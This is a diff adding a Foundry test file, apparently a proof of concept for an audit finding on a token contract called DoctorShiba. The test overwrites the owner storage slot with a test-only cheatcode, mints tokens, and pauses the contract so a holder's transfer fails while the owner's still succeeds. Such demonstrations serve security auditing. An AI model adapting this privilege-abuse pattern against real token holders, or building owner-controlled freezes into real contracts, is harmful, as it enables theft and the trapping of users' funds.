@@ -1,0 +1,77 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import "forge-std/Test.sol";
+
+interface IDoctorShiba {
+    function owner() external view returns (address);
+    function pause() external;
+    function unpause() external;
+    function paused() external view returns (bool);
+    function mint(address to, uint256 amount) external returns (bool);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    // Target contract address from the report
+    address constant TARGET = 0x783e086d67670c0d85c4ef34ebbee5a8253b38ee;
+    IDoctorShiba constant doctorShiba = IDoctorShiba(TARGET);
+
+    address victim = address(0x1234);
+    address recipient = address(0x5678);
+
+    function setUp() public {
+        // Label addresses for readability
+        vm.label(TARGET, "DoctorShiba");
+        vm.label(victim, "Victim");
+        vm.label(recipient, "Recipient");
+    }
+
+    function testPauseAbuse() public {
+        // Step 1: Overwrite owner storage to become owner
+        // The first storage slot (slot 0) in Ownable is _owner (address)
+        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(address(this))));
+        // Verify we are now owner
+        assertEq(doctorShiba.owner(), address(this));
+
+        // Step 2: Mint tokens to victim (as owner)
+        uint256 mintAmount = 1000 * 1e9; // 1000 tokens with 9 decimals
+        vm.prank(address(this));
+        doctorShiba.mint(victim, mintAmount);
+        assertEq(doctorShiba.balanceOf(victim), mintAmount);
+
+        // Step 3: Pause the contract (only owner can do this)
+        vm.prank(address(this));
+        doctorShiba.pause();
+        assertTrue(doctorShiba.paused());
+
+        // Step 4: Victim attempts to transfer tokens (should revert with "paused")
+        vm.prank(victim);
+        vm.expectRevert(bytes("paused"));
+        doctorShiba.transfer(recipient, mintAmount);
+
+        // Step 5: Owner can still transfer (transfer from owner to recipient should succeed)
+        // First, give owner some tokens via mint (normally owner already has all supply)
+        // But we can also just transfer from victim? No, only owner is exempt.
+        // Owner can transfer freely.
+        // Mint some tokens to owner (self)
+        vm.prank(address(this));
+        doctorShiba.mint(address(this), mintAmount);
+        vm.prank(address(this));
+        bool success = doctorShiba.transfer(recipient, mintAmount);
+        assertTrue(success);
+
+        // Step 6: Unpause and verify victim can transfer again
+        vm.prank(address(this));
+        doctorShiba.unpause();
+        assertFalse(doctorShiba.paused());
+
+        vm.prank(victim);
+        success = doctorShiba.transfer(recipient, mintAmount);
+        assertTrue(success);
+    }
+}
+```
